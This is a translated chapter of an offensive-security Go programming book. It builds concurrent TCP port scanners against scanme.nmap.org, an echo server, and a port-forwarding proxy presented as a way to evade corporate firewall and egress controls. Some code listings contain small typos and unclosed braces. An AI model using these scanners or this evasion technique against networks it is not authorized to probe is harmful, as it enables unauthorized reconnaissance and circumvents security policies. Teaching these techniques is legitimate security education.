# 第2章：TCP和GO：扫描器和代理

* [摘要](di-2-zhang-tcp-he-go-sao-miao-qi-he-dai-li.md#摘要)
* [理解TCP握手](di-2-zhang-tcp-he-go-sao-miao-qi-he-dai-li.md#理解TCP握手)
* [通过端口转发绕过防火墙](di-2-zhang-tcp-he-go-sao-miao-qi-he-dai-li.md#通过端口转发绕过防火墙)
* [编写TCP扫描程序](di-2-zhang-tcp-he-go-sao-miao-qi-he-dai-li.md#编写TCP扫描程序)
  * [测试端口可用性](di-2-zhang-tcp-he-go-sao-miao-qi-he-dai-li.md#测试端口可用性)
  * [非并发的扫描](di-2-zhang-tcp-he-go-sao-miao-qi-he-dai-li.md#非并发的扫描)
  * [并发扫描](di-2-zhang-tcp-he-go-sao-miao-qi-he-dai-li.md#并发扫描)
    * [“更快的”扫描器版本](di-2-zhang-tcp-he-go-sao-miao-qi-he-dai-li.md#“更快的”扫描器版本)
    * [使用WaitGroup同步扫描](di-2-zhang-tcp-he-go-sao-miao-qi-he-dai-li.md#使用WaitGroup同步扫描)
    * [多管道通讯](di-2-zhang-tcp-he-go-sao-miao-qi-he-dai-li.md#多管道通讯)
* [构建TCP代理](di-2-zhang-tcp-he-go-sao-miao-qi-he-dai-li.md#构建TCP代理)
  * [使用io.Reader和io.Writer](di-2-zhang-tcp-he-go-sao-miao-qi-he-dai-li.md#使用io.Reader和io.Writer)
  * [创建Echo服务](di-2-zhang-tcp-he-go-sao-miao-qi-he-dai-li.md#创建Echo服务)
  * [通过创建带有缓冲的侦听器来改进代码](di-2-zhang-tcp-he-go-sao-miao-qi-he-dai-li.md#通过创建带有缓冲的侦听器来改进代码)
  * [代理TCP客户端](di-2-zhang-tcp-he-go-sao-miao-qi-he-dai-li.md#代理TCP客户端)
  * [复制Netcat执行命令](di-2-zhang-tcp-he-go-sao-miao-qi-he-dai-li.md#复制Netcat执行命令)
* [总结](di-2-zhang-tcp-he-go-sao-miao-qi-he-dai-li.md#总结)

## 摘要

开始使用_传输控制协议\(TCP\)_ 开发Go的实际应用，TCP是面向连接的可靠通信的主要标准，以及现代网络的基础。TCP无处不在，并且有完善的文档库、代码示例以及易于理解的常用数据包流。必须了解TCP才能全面评估，分析，查询和操作网络。

作为攻击者，应该明白TCP的工作原理，并能够开发可用的TCP组件，以便可以识别开启/关闭的端口，识别潜在地错误的结果，像误报（如，SYN洪流保护）和通过端口转发绕过出口限制等。在本章中，将学习Go中的基本TCP通信。构建并发的，经过适当控制的端口扫描程序；创建可用于端口转发的TCP代理；并重新创建Netcat的“开放安全漏洞”功能。

已经有了书籍来讲解TCP的每一个细微的差别，包括数据包的结构和流，可靠性，通信重组等。这种细节超出了本书的范围。更多详细信息请阅读Charles M. Kozierok撰写的《TCP / IP Guide》（No Starch Press，2005）。（注：No Starch Press是一家专注于出版计算机图书的出版社）

## 理解TCP握手

复习回顾一下基本知识。图2-1显示了TCP在查询端口以确定端口是开发，关闭还是过滤时如何使用握手过程。

![](https://github.com/YYRise/black-hat-go/raw/dev/ch-2/images/2-1.png)

 图2-1：TCP握手原理

如果端口是开放的，则会进行3次握手。第一次，客户端发送一个syn数据包，表示通信开始。然后服务端以syn-ack包响应收到的syn包，提示客户端再以ack包响应服务器的确认，至此3次握手结束。然后就可以通信传输数据了。如果端口是关闭的，服务端以rst包代替syn-ack响应。如果流量被防火墙过滤，则客户端通常不会收到服务器的任何响应。

在做网络开发时，理解这些响应是非常重要的。把输出的数据和这些低级数据包相关联，有助于验证是否已正确建立网络连接并排查潜在的问题。正如本章后面那样，如果客户端-服务器TCP连接未能完成握手，从而导致结果不准确或产生误导，您可以轻松地在代码找出bug。

## 通过端口转发绕过防火墙

通过配置防火墙，可以防止客户端连接到某些服务器的端口，同时允许访问其他服务器的端口。在某些情况下，要规避这些限制，可以使用中间系统代理绕过或穿过防火墙的连接（称为端口转发）。

许多企业网络限制内部与恶意站点建立HTTP连接。举例，假如`evil.com`是个恶意网站。如果员工直接浏览`evil.com`，防火墙会阻止该请求。然而，如果员工拥有允许通过防火墙的外部系统（例如，`stacktitan.com`），该员工可以利用允许的域来跳转到`evil.com`。图2-2说明了此概念

![](https://github.com/YYRise/black-hat-go/raw/dev/ch-2/images/2-2.png)

 图2-2：TCP代理

客户端通过防火墙连接到目标主机stacktitan.com。该主机配置为将连接转发到`evil.com`主机。尽管防火墙禁止直接连接到`evil.com`，但如此处所示的配置可以使客户端绕过此保护机制并访问`evil.com`。

使用端口转发来开发多种限制性网络配置。例如，可以通过跳转框转发流量，以访问分段网络或访问绑定到限制接口的端口。

## 编写TCP扫描程序

理解TCP端口交互概念的一种有效方法是实现端口扫描程序。顺便理清TCP握手步骤，以及状态改变的影响，这些状态更改可确定TCP端口是否可用，或是否响应关闭或过滤状态。

一旦编写完基础的扫描程序，会更快地编写下一个。端口扫描程序可以使用一种连续的方法扫描多个端口；然而，当扫描所有65,535个端口时就会变得很耗时。所以在扫描很多端口时要研究如何使用并发来提高效率。

还可以将在本节中学习的并发模式应用到本书中及很多其他场景中。

### 测试端口可用性

创建端口扫描程序的第一步是了解如何初始化从客户端到服务器的连接。整个示例中，将连接并扫描由Nmap的`scanme.nmap.org`服务。为此，要用到 Go 的 net 包中的：`net.Dial(network, address string)`。 第一个参数是一个字符串，用于标识要启动的连接的类型。因为Dial不仅仅适用于TCP；也能创建Unix的sockets，UDP和第4层协议的连接（作者走过这条路，可以说TCP非常好）。可以使用很多字符串，但是为了简洁起见，使用字符串tcp就可以了。

第二个参数告诉`Dial(network，address string)`要连接的主机。注意，这是单个字符串，而不是字符串和整数。对于IPv4 / TCP连接，采用host：port的形式。例如，scanme.nmap.org:80表示要和scanme.nmap.org的80端口建立TCP连接。

现在知道了如何创建连接，但是如何知道连接是否成功呢？答案是通过判断`Dial(network，address string)`的返回值`Conn` 和`error`，如果连接成功，则`error`为nil。

尽管有点凑合，但现在已经有了构建单个端口扫描程序所需的所有内容。代码2-1是将其组合起来。

```go
package main
import (
    "fmt"
    "net"
)
func main() {
    _, err := net.Dial("tcp", "scanme.nmap.org:80")
    if err == nil {
        fmt.Println("Connection successful")
    }
}
```

代码 2-1: 只扫描一个端口的基础扫描程序 \([https://github.com/blackhat-go/bhg/blob/master/ch-2/dial/main.go/](https://github.com/blackhat-go/bhg/blob/master/ch-2/dial/main.go/)\)

运行此代码。如果访问到很多信息，则表示连接成功。

### 非并发的扫描

一次扫描一个端口没什么用，效率也肯定不高。 TCP端口范围是1到65535；为了测试，只扫描端口1至1024。使用for循环实现：

```go
for i:=1; i <= 1024; i++ {
}
```

现在有了一个整数，但是需要一个字符串作为`Dial(network, address string)`的第二个参数。至少有两种方法可以将整数转换为字符串。一种方法是使用字符串转换包strconv。另一种方法是使用fmt包中的`Sprintf(format string，... interface {})`，返回格式化的字符串。

```go
package main
import (
    "fmt"
)
func main() {
    for i := 1; i <= 1024; i++ {
        address := fmt.Sprintf("scanme.nmap.org:%d", i)
        fmt.Println(address)
    }
}
```

代码 2-2: 扫描scanme.nmap.org的1024个端口\([https://github.com/blackhat-go/bhg/ch-2/tcp-scanner-slow/main.go/](https://github.com/blackhat-go/bhg/ch-2/tcp-scanner-slow/main.go/)\)

剩下的就是将示例中的地址传入`Dial(network, address string)`，并执行上一部分中相同的错误检查来测试端口的可用性。如果连接成功，还应该添加些逻辑来关闭连接；这样连接就不会一直打开。调用Conn的Close\(\)函数结束连接会优雅些。代码清单2-3是完整的端口扫描程序。

```go
package main
import (
    "fmt"
    "net"
)
func main() {
    for i := 1; i <= 1024; i++ {
        address := fmt.Sprintf("scanme.nmap.org:%d", i)
        conn, err := net.Dial("tcp", address)
        if err != nil {
            // port is closed or filtered.
continue }
        conn.Close()
        fmt.Printf("%d open\n", i)
} }
```

代码 2-3: 完整的端口扫描程序 \([https://github.com/blackhat-go/bhg/ch-2/tcp-scanner-slow/main.go/](https://github.com/blackhat-go/bhg/ch-2/tcp-scanner-slow/main.go/)\)

编译并执行此代码对目标轻量扫描，应该会有几个打开的端口。

### 并发扫描

上一个扫描程序一次扫描多个端口，但是并发扫描会更快些。为此，引入goroutine，只要系统能处理过来，可用内存足够，Go就可以创建尽可能多的goroutine。

#### “更快的”扫描器版本

并发扫描的最本质的做法是将`Dial(network, address string)`封装在一个goroutine中去调用。因此，将代码2-4保存到新文件scan-too-fast.go，然后执行该文件。

```go
package main
import (
    "fmt"
    "net"
)
func main() {
    for i := 1; i &lt;= 1024; i++ {
        go func(j int) {
            address := fmt.Sprintf("scanme.nmap.org:%d", j)
            conn, err := net.Dial("tcp", address)
            if err != nil {
                return
            }
            conn.Close()
            fmt.Printf("%d open\n", j)
        }(i)
    }
}
```

Listing 2-4: 更快的扫描代码 \([https://github.com/blackhat-go/bhg/ch-2/tcp-scanner-too-fast/main.go/](https://github.com/blackhat-go/bhg/ch-2/tcp-scanner-too-fast/main.go/)\)

运行此代码后，程序应该立即退出：

```bash
$ time ./tcp-scanner-too-fast
./tcp-scanner-too-fast 0.00s user 0.00s system 90% cpu 0.004 total
```

这是因为为每一个连接分配了一个goroutine，main函数所在的goroutine并不知道要等待连接。因此，代码执行完for循环后就退出了，这要比代码里的网络通信快多了。也就无法得到正确的结果了。

有几种方法可以修正。一种是使用sync包的`WaitGroup`，用来控制并发线程安全。`WaitGroup`是结构体类型，可以用下面方式创建：

```go
var wg sync.WaitGroup
```

创建`WaitGroup`后就可以调用它的几种方法了。第一个是`Add(int)`，将参数值加到内部的计数器值上。下一个是`Done()`，将计数器值减一。最后是`Wait()`，阻塞所调用的goroutine，直到内部计数器值变为0。组合这几个函数的调用就能让main goroutine等待所有的goroutine执行完。

#### 使用`WaitGroup`同步扫描

代码2-5使用goroutines实现的端口扫描程序。

```go
package main
import (
    "fmt"
    "net"
"sync"
)
func main() {
  ❶ var wg sync.WaitGroup
    for i := 1; i <= 1024; i++ {
      ❷ wg.Add(1)
        go func(j int) {
          ❸ defer wg.Done()
            address := fmt.Sprintf("scanme.nmap.org:%d", j) 
            conn, err := net.Dial("tcp", address)
            if err != nil {
                return 
            }
            conn.Close()
            fmt.Printf("%d open\n", j)
        }(i)
    }
  ❹ wg.Wait() 
}
```

代码 2-5: 使用`WaitGroup`的同步扫描器 \([https://github.com/blackhat-go/bhg/ch-2/tcp-scanner-wg-too-fast/main.go/](https://github.com/blackhat-go/bhg/ch-2/tcp-scanner-wg-too-fast/main.go/)\)

代码逻辑与初始版本大致相同。在此版本的程序中，创建了用作同步计数的`sync.WaitGroup`❶，每次创建扫描端口的goroutine时，通过`wg.Add(1)`递增计数器的值❷，并且defer语句调用`wg.Done()`，每当执行完后就使计数器的值递减❸。`main()`函数调用`wg.Wait()`，等待所有的goroutine执行完，且计数器的值归0❹。

该程序的版本更好，但仍然不正确。如果多次运行或在不同机器执行可能得到不一致的结果。同时扫描过多的主机或端口可能会导致网络或系统限制，造成结果不正确。继续，在代码中将1024更改为65535，并且将服务器地址改为本机的127.0.0.1。如果需要，可以使用Wireshark或tcpdump查看打开这些连接的速度。

#### 使用工作池的端口扫描

为避免不一致，使用goroutine池来管理并发的执行。使用for循环创建一定数量goroutines作为资源池。然后，在`main()`所在的“线程”中使用channel来提供任务。

首先，创建有100个工人，int类型channel的新程序，并输出到屏幕上。仍然使用`WaitGroup`阻塞执行。在main中调用初始化的代码。基于此的函数如2-6所示：

```go
func worker(ports chan int, wg *sync.WaitGroup) {
    for p := range ports {
        fmt.Println(p)
    wg.Done() }
}
```

代码 2-6: 处理任务工作代码

`worker(chan int, *sync.WaitGroup)`需要两个参数：int类型的channel和WaitGroup指针。channel用来接收工作，WaitGroup用于标记工作完成。

现在，添加清单2-7中所示的main\(\)函数，该函数管理任务量并将任务提供给`worker(chan int, *sync.WaitGroup)`。

```go
package main
import (
    "fmt"
    "sync" 
)
func worker(ports chan int, wg *sync.WaitGroup) {
  ❶ for p := range ports {
        fmt.Println(p)
        wg.Done() 
    }
}
func main() {
  ❷ ports := make(chan int, 100) 
    var wg sync.WaitGroup
  ❸ for i := 0; i < cap(ports); i++ { 
        go worker(ports, &wg)
    }
    for i := 1; i <= 1024; i++ {
        wg.Add(1) 
      ❹ ports <- i
    }
    wg.Wait()
  ❺ close(ports)
}
```

代码 2-7: 基本的工作池 \([https://github.com/blackhat-go/ch-3/tcp-sync-scanner/main.go/](https://github.com/blackhat-go/ch-3/tcp-sync-scanner/main.go/)\)

首先，使用`make()`❷创建channel，第二个参数100是设置channel的缓存大小，缓存的意思是不需要等待消费掉channel里的值就能往channel里写入。带有缓存的channel是处理多个消费者和生产者的理想产物。此处，channel的容量设为100，即生成者发送100个值后才会阻塞。这能稍微提高点性能，因为所有任务可以立即执行。

接下来，使用for循环❸启动所需的worker数量——在本例中为100。在`worker(int, *sync.WaitGroup)`函数中使用range❶持续地从ports管道消费数据，直到关闭channel才退出循环。目前为止还没有任务要处理，但接下来就有了。在`main()`函数中依次遍历端口，将端口通过ports管道❹发送给worker。所有的任务完成后就可以关闭管道了❺。

编译并允许该程序会在屏幕上看到输出的端口。有趣的是：这些端口的输出是无序的。欢迎来到精彩的并行世界。

#### 多管道通讯

插入到本节前面的代码中就完成了端口扫描器，且可以正常的工作。然而，因为该扫描器不会按顺序检查端口，所以打印的端口是无序的。重构下看起来更优雅些，重构后逻辑仍然一样，应该不会有问题。重构的另一个好处是完全删除了`WaitGroup`的依赖，因为会有其他的方法跟踪groutine的完成情况。例如，如果扫描1024个端口就好像worker的管道中发送1024次，并且也将结果发送到main线程1024次。因为发送的任务数量要和收到的结果数量相同，因此程序就能知道何时关闭管道并随后关闭worker。

代码2-8是修改后的代码，完整的端口扫描程序。

```go
package main
import (
    "fmt"
    "net"
    "sort"
)
func worker(ports, results chan int) { 
    for p := range ports {
        address := fmt.Sprintf("scanme.nmap.org:%d", p)
        conn, err := net.Dial("tcp", address)
        if err != nil {
            results <- 0 
            continue
        }
        conn.Close() 
        results <- p
    } 
}
func main() {
    ports := make(chan int, 100)
    results := make(chan int) 
    var openports []int
    for i := 0; i < cap(ports); i++ {
        go worker(ports, results)
    }
    go func() {
        for i := 1; i <= 1024; i++ {
            ports <- i 
        }
    }()
    for i := 0; i < 1024; i++ { 
        port := <-results
        if port != 0 {
            openports = append(openports, port)
        } 
    }
    close(ports)
    close(results)
    sort.Ints(openports)
    for _, port := range openports {
        fmt.Printf("%d open\n", port)
    }
}
```

代码 2-8: 使用多管道扫描端口\([https://github.com/blackhat-go/bhg](https://github.com/blackhat-go/bhg) /ch-2/tcp-scanner-final/main.go/\)

`worker(ports, results chan int)`函数修改为接收两个管道；其余的逻辑一样，端口关闭发送0值，端口开启就发送该端口值。此外，还创建了一个将结果返回到main线程的管道。为方便排序，使用切片保存结果。接下来，单起一个goroutine发送任务，因为必须先启动接收结果的循环，然后才能继续执行100多个任务。

接收结果的循环从管道中接收1024次结果。将不为0的端口添加到切片中。之后关闭管道，使用`sort`函数排序切片中开放的端口。剩下的就是循环切片，并将开放的端口打印到屏幕上。

现在有了一个高效的端口扫描器。花点时间看下代码，尤其是worker的数量。数量越多，程序应执行得越快。但是，过多的worker会让结果不稳定。当编写供其他人使用的工具时，希望合适的默认值达到可靠的速度，但是，还应允许用户选择worker数量。

你可以对程序做些改进。首先，没有必要把扫描的每个端口发送到结果管道。满足要求的替代代码稍微复杂一点，因为使用额外的管道不只是为了追踪worker，而且通过确保所有收集结果的完成来防止出现竞争状况。因为这是介绍性的一章，所以我们故意省略了此内容。其次，你可能希望扫描器能够解析端口字符串，例如80,443,8080,21-25，就像可以传递给Nmap的字符串一样。如果要了解此实现，请参阅[https://github.com/blackhat-go/bhg/blob/master/ch-2/scanner-port-format/](https://github.com/blackhat-go/bhg/blob/master/ch-2/scanner-port-format/)我们将其作为练习。

## 构建TCP代理

您可以使用Go的内置网络包来实现所有基于TCP的通信。上一节主要从客户端的角度着眼于使用net软件包，本节将使用它来创建TCP服务器和传输数据。通过构建必要的回显服务器（一个仅将给定响应回显给客户端的服务器）和随后两个更通用的程序（TCP端口转发器和重建Netcat的“开放安全漏洞”执行远程命令）来开始。

### 使用`io.Reader`和`io.Writer`

要创建本节中的示例，无论使用的是TCP，HTTP，文件系统还是其他的任何方式，都要使用两个重要的类型：`io.Reader`和`io.Writer`，本质是输入/输出（I/O）任务。这两个类型是Go内置io包的一部分，是任何本地或网络数据传输的基石。在Go的文档中定义如下：

```go
type Reader interface {
    Read(p []byte) (n int, err error)
}
type Writer interface {
    Write(p []byte) (n int, err error)
}
```

两种类型都定义为接口，这意味着它们不能直接实例化。每种类型包含一个导出函数的定义：`Reader` 和 `Writer`，如第1章所述，您可以将这些函数视为抽象方法，必须在一种类型上实现该方法才能将其视为`Reader`或`Writer`。例如，下面的类型实现了该方法，就可以用在任何接受Reader的地方：

```go
type FooReader struct {}
func (fooReader *FooReader) Read(p []byte) (int, error) {
    // 从某地读数据
     return len(dataReadFromSomewhere), nil
}
```

同样的实现也适用于Writer接口：

```go
type FooWriter struct {}
func (fooWriter *FooWriter) Write(p []byte) (int, error) {
    // 往某地写数据
    return len(dataWrittenSomewhere), nil
}
```

利用这些知识就可以创建一些半可用的东西：封装了stdin和stdout的自定义Reader和Writer。由于Go的os.Stdin和os.Stdout类型已经充当了Reader和Writer，所以代码有些故意为之，但是如果不时地重新造轮子，那么将不会学到任何知识，是吗？

代码2-9显示了完整的实现，并在下面进行了说明。

```go
package main
import (
    "fmt"
    "log"
    "os" 
)
// FooReader defines an io.Reader to read from stdin. 
❶ type FooReader struct{}
// Read reads data from stdin.
❷ func (fooReader *FooReader) Read(b []byte) (int, error) {
    fmt.Print("in > ")
    return os.Stdin.Read(b)❸ 
}
// FooWriter defines an io.Writer to write to Stdout. 
❹ type FooWriter struct{}
// Write writes data to Stdout.
❺ func (fooWriter *FooWriter) Write(b []byte) (int, error) {
    fmt.Print("out> ")
    return os.Stdout.Write(b) ❻ 
}
func main() {
    // Instantiate reader and writer.
    var (
       reader FooReader
       writer FooWriter
    )
    // Create buffer to hold input/output. {
  ❼ input := make([]byte, 4096)
    // Use reader to read input. 
    s, err := reader.Read(input) ❽
    if err != nil {
        log.Fatalln("Unable to read data")
    }
    fmt.Printf("Read %d bytes from stdin\n", s)
    // Use writer to write output. 
    s, err = writer.Write(input) ❾
    if err != nil {
        log.Fatalln("Unable to write data")
    }
    fmt.Printf("Wrote %d bytes to stdout\n", s)
}
```

代码 2-9: reader 和 writer 示例 \([https://github.com/blackhat-go/bhg/ch-2/io-example/main.go/](https://github.com/blackhat-go/bhg/ch-2/io-example/main.go/)\)

首先定义了两个类型：FooReader 和 FooWriter。在FooReader 中实现了 Read\(\[\]byte\) 函数，在 FooWriter 中实现了 Write\(\[\]byte\) 函数。在该例中，这两个函数从 stdin 读和写到 stdout 。

注意到 FooReader 和 os.Stdin 的 Read 函数都返回数据长度和错误。数据本身被复制到函数的 byte 切片中。这和本节前面定义的 Reader 接口是一致的。main\(\) 函数新建切片（命名为input），然后继续在 FooReader.Read\(\[\]byte\) 和 FooReader.Write\(\[\]byte\) 使用。

运行代码，结果如下：

```bash
$ go run main.go
in > hello world!!!
Read 15 bytes from stdin out> hello world!!!
Wrote 4096 bytes to stdout
```

经常用到将数据从 Reader 复制到 Writer ，以至于Go的 io 包中内置了 Copy（）函数，这能大大简化 main（）函数。函数原型如下：

```go
func Copy(dst io.Writer, src io.Reader) (written int64, error)
```

使用此函数可以实现与之前相同的功能，用清单2-10中的代码替换main（）函数。

```go
func main() {
    var (
        reader FooReader
        writer FooWriter
    )
    if _, err := io.Copy(&writer, &reader)u; err != nil { 
    log.Fatalln("Unable to read/write data")
    } 
}
```

代码 2-10: 使用 io.Copy \([https://github.com/blackhat-go/ch-3/copy-example/main.go/](https://github.com/blackhat-go/ch-3/copy-example/main.go/)\)

注意，对 reader.Read\(\[\]byte\) 和 writer.Write\(\[\] byte\) 的显式调用已替换为对 io.Copy\(writer, reader\) 的调用。在函数内部，io.Copy\(writer, reader\) 调用 reader 的 Read\(\[\]byte\) 函数时, 将会触发FooReader从stdin读取。 随后，io.Copy\(writer, reader\) 调用 write 的 Write\(\[\]byte\) 函数，其实调用了 FooWriter 将数据写到 stdout 。本质上，io.Copy\(writer, reader\) 处理先读后写的过程是没有琐碎的细节的。

本章节并不是介绍Go的 I/O 和接口的。Go的标准包中有很多这样的简便函数和自定义的读写。多数情况下，Go的标准包中都有常用函数的实现。在下一节中，我们将探讨如何将这些基础知识应用到TCP通信中，最终用所学来开发现实生活中可用的工具。

### 创建Echo服务

像多数语言那样，通过创建 echo 服务学习如何在 socket 中读写数据。为此，使用 Go 的流式网络连接 net.Conn ，前面创建端口扫描器时已经介绍过了。基于 Go 的规范，Conn 实现了 Reader 和 Writer 接口的 Read\(\[\]byte\) 和 Write\(\[\]byte\) 函数。因此， Conn 既有 Reader 又有 Writer 。逻辑上来说这是很有必要的，因为 TCP 连接是双向的，可以用于发送（写入）或接收（读取）数据。

创建 Conn 后，就可以通过TCP套接字发送和接收数据。然而， TCP 服务器不能建立连接；必须客户建立连接。Go中， 先使用 net.Listen\(network, address string\) 开启某个端口的 TCP 监听。一旦客户端连接，Accept\(\) 方法创建并返回一个 Conn 对象，可以用来接收和发送数据。

清单2-11展示了服务器实现的完整示例。为了清晰起见，我们在行内添加了注释。不必担心会不能读懂整个代码，因为我们会立即对其进行分解。

```go
package main
import (
    "log"
    "net"
)
// echo is a handler function that simply echoes received data.
func echo(conn net.Conn) {
    defer conn.Close()
    // Create a buffer to store received data.
    b := make([]byte, 512)
  ❶ for {
        // Receive data via conn.Read into a buffer.  
        size, err := conn.Read❷(b[0:])
        if err == io.EOF {
            log.Println("Client disconnected")
break 
        }
        if err != nil {
            log.Println("Unexpected error")
            break
        }
        log.Printf("Received %d bytes: %s\n", size, string(b))
        // Send data via conn.Write.
        log.Println("Writing data")
        if _, err := conn.Write❸(b[0:size]); err != nil {
            log.Fatalln("Unable to write data")
        }
    } 
}
func main() {
    // Bind to TCP port 20080 on all interfaces.
  ❹ listener, err := net.Listen("tcp", ":20080")
    if err != nil {
        log.Fatalln("Unable to bind to port")
    }
    log.Println("Listening on 0.0.0.0:20080")
  ❺ for {
    // Wait for connection. Create net.Conn on connection established.
  ❻ conn, err := listener.Accept()
    log.Println("Received connection")
    if err != nil {
        log.Fatalln("Unable to accept connection")
    }
    // Handle the connection. Using goroutine for concurrency.
  ❼ go echo(conn)
```

代码 2-11: 基本的echo服务 \([https://gihub.com/blackhat-go/bhg/ch-2/echo-server/main.go/](https://gihub.com/blackhat-go/bhg/ch-2/echo-server/main.go/)\)

清单2-11首先定义了 echo\(net.Conn\) 函数，参数为 Conn 对象。充当执行所有必要 I/O 的连接处理器。函数含有一个死循环，使用 buffer 从连接中读写数据。数据被读入到变量 b 中，然后写回连接中。

现在设置一个调用处理器的监听。如前所述，服务器无法建立连接，必须监听客户端进行连接。因此，监听器使用 net.Listen\(network, address string\) 监听 20080 端口的所有 tcp 连接。

接下来，死循环确保服务器即使在收到连接后仍将继续监听连接。在循环中调用 listener.Accept\(\) ，该函数阻塞执行直到等到客户端的连接。当客户端连接时，该函数返回一个 Conn 对象。回忆下本节前面的介绍，Conn 既是 Reader 又是 Writer（它实现了Read\(\[\]byte\) 和 Write\(\[\]byte\) 接口方法）。

Conn 对象传递给 echo\(net.Conn\) 函数。调用以 go 关键字开头，使其成为并发调用，以便在等待处理函数完成前不会阻塞其他连接。对于简单的服务来说这样的用法可能有点过头，万一还有不清楚的话，就再涉及下来证明 Go 并发模式的简单些。此时，有了两个轻量的线程并发运行。

* 主线程中的循环阻塞在 listener.Accept\(\) 等待其他的连接
* 处理器中的 goroutine ，在 echo\(net.Conn\) 函数中运行并处理数据。

下面显示了使用 Telnet 作为连接客户端的示例：

```bash
$ telnet localhost 20080 
Trying 127.0.0.1... 
Connected to localhost. 
Escape character is '^]'. 
test of the echo server 
test of the echo server
```

服务器生成下面的标准输出：

```bash
$ go run main.go
2020/01/01 06:22:09 Listening on 0.0.0.0:20080
2020/01/01 06:22:14 Received connection
2020/01/01 06:22:18 Received 25 bytes: test of the echo server 
2020/01/01 06:22:18 Writing data
```

新颖吧？服务器完全将客户端发送的内容又发送给客户端。多么有用和令人兴奋的例子！还运行了很长时间。

### 通过创建带有缓冲的侦听器来改进代码

清单2-11中的示例工作得很完美，但使用的相当低级的函数调用，缓冲区跟踪和迭代读/写。这是一个乏味且容易出错的过程。幸运的是，Go 中有其他的包可以简化该过程，并能降低代码的复杂度。那就是 bufio 包，封装了 Reader 和 Writer 来创建带有缓冲的 I/O 机制。更新后 echo\(net.Conn\) 函数在此有详细说明，更改的说明如下：

```go
func echo(conn net.Conn) {
    defer conn.Close()

  ❶ reader := bufio.NewReader(conn)
    s, err := reader.ReadString('\n')❷ 
    if err != nil {
        log.Fatalln("Unable to read data")
    }
    log.Printf("Read %d bytes: %s", len(s), s)

    log.Println("Writing data") 
  ❸ writer := bufio.NewWriter(conn)
    if _, err := writer.WriteString(s)❹; err != nil { 
    log.Fatalln("Unable to write data")
    }
  ❺ writer.Flush()
}
```

不再直接调用 Conn 对象的 Read\(\[\]byte\) 和 Write\(\[\]byte\) 函数；通过 NewReader\(io.Reader\) 和 NewWriter\(io.Writer\) 来初始化带缓冲的 Reader 和 Writer 替代。这两个调用均以现有的Reader和Writer作为参数（记住，Conn 类型实现了必要的函数，即被视为 Reader 又被视为 Writer ）。

这两个带缓冲的实例都补充了读写字符串的函数。ReadString\(byte\) 带有分隔符用于读取多少字符，而 WriteString\(byte\) 将字符串写到 socket 。写完数据后需要 显示调用 writer .Flush\(\) 冲刷所有的数据写入到底层的 writer （本例中是 Conn 实例）。

尽管前面的示例通过使用带有缓冲的 I/O 简化了过程，但可以使用更方便的 Copy\(Writer, Reader\) 函数重构。回想该函数将目标Writer和源Reader作为输入，仅仅是从源复制到目标。

本例中，将 conn 变量作为源和目标传递，因为是在建立的连接上回显内容：

```go
func echo(conn net.Conn) {
    defer conn.Close()
    // Copy data from io.Reader to io.Writer via io.Copy().
    if _, err := io.Copy(conn, conn); err != nil {
        log.Fatalln("Unable to read/write data")
    }
}
```

已经探讨了 I/O 的基础知识，并将其应用于 TCP 服务。现在是时候继续学习更多有用的相关例子了。

### 代理TCP客户端

有了坚实的基础，就可以利用到目前为止所学的知识创建一个简单的端口转发器，通过中介服务或主机代理连接。如本章前面所述，这对于尝试规避限制性出口控制或利用系统绕过网络分段很有用。

在设计代码之前，考虑个虚构但现实的问题：Joe 是表现不佳的员工，曾在ACME Inc.工作，担任业务分析师，由于他的建立中的一些水分，其收入可观。（他真的读过长春藤吗？乔，这是很不道德的。）乔的上进心不足和他对猫的热爱旗鼓相当，以至于乔在家里为猫安装了摄像头，并拥建了 joescatcam.website 网站，通过该网站，他可以远程监视猫的一切。但是，有一个问题：ACME 是 Joe 上司，他们不喜欢他占用昂贵的 ACME 带宽7x24小时传输猫的4K超高清视频，ACME 甚至禁止员工访问 Joe 的猫视频网站。

Joe 有个主意。 “如果我在我控制的基于Internet的系统上设置端口转发器，并且将所有流量从该主机重定向到 joescatcam.website ，该怎么办？” Joe 说到。Joe 第二天上班检查并确认他可以访问他的个人网站 joesproxy.com 。Joe 躲过了下午会议，前往咖啡店，并迅速为他的问题编写了解决方案。他将在 [http://joesproxy.com](http://joesproxy.com) 上收到的所有流量转发到 [http://joescatcam.website](http://joescatcam.website) 。

他的运行 joesproxy.com 服务的代码在这：

```go
func handle(src net.Conn) {
    dst, err := net.Dial("tcp", "joescatcam.website:80") ❶
    if err != nil {
        log.Fatalln("Unable to connect to our unreachable host")
    }
    defer dst.Close()
    // Run in goroutine to prevent io.Copy from blocking 
  ❷ go func() {
        // Copy our source's output to the destination 
        if _, err := io.Copy(dst, src)❸; err != nil {
            log.Fatalln(err)
        }
    }()
    // Copy our destination's output back to our source 
    if _, err := io.Copy(src, dst)❹; err != nil {
        log.Fatalln(err)
    }
}
func main() {
    // Listen on local port 80
    listener, err := net.Listen("tcp", ":80")
    if err != nil {
        log.Fatalln("Unable to bind to port")
    }
    for {
        conn, err := listener.Accept()
        if err != nil {
            log.Fatalln("Unable to accept connection")
        }
        go handle(conn)
    }
}
```

首先检查 Joe 的 handle\(net.Conn\) 函数。Joe 连接到 joescatcam.website （回想一下，无法从 Joe 公司的站点直接访问这个主机）。Joe 然后两次使用 Copy\(Writer, Reader\) 。第一次确保将来连接到网站的数据复制到 joescatcam.website 连接中。第二次确保从 joescatcam.website 读到的数据写回到客户端的连接中。因为 Copy\(Writer, Reader\) 是个阻塞函数，一直阻塞到连接关闭。Joe 明智地在新的 goroutine 中封装了对 Copy\(Writer, Reader\) 的首次调用。这样确保继续执行 handle\(net.Conn\) 函数，并且可以调用第二个 Copy\(Writer, Reader\) 。

Joe 的代理监听在 80 端口，并转发连接到joescatcam.website 80 端口的流量。Joe，疯狂而浪费的家伙，确认他可以通过使用 curl 连接到 joesproxy.com 再转发到 joescatcam.website：

```bash
$ curl -i -X GET http://joesproxy.com 
HTTP/1.1 200 OK
Date: Wed, 25 Nov 2020 19:51:54 GMT
Server: Apache/2.4.18 (Ubuntu) 
Last-Modified: Thu, 27 Jun 2019 15:30:43 GMT ETag: "6d-519594e7f2d25"
Accept-Ranges: bytes 
Content-Length: 109 
Vary: Accept-Encoding 
Content-Type: text/html 
--snip--
```

至此，Joe 已经完成了。他实现了梦想，在看猫时浪费了 ACME 的时间和网络带宽。今天有猫了！

### 复制Netcat执行命令

在本节中，我们将复制 Netcat 的一些更有趣的功能 —— 特别是其巨大的安全漏洞。

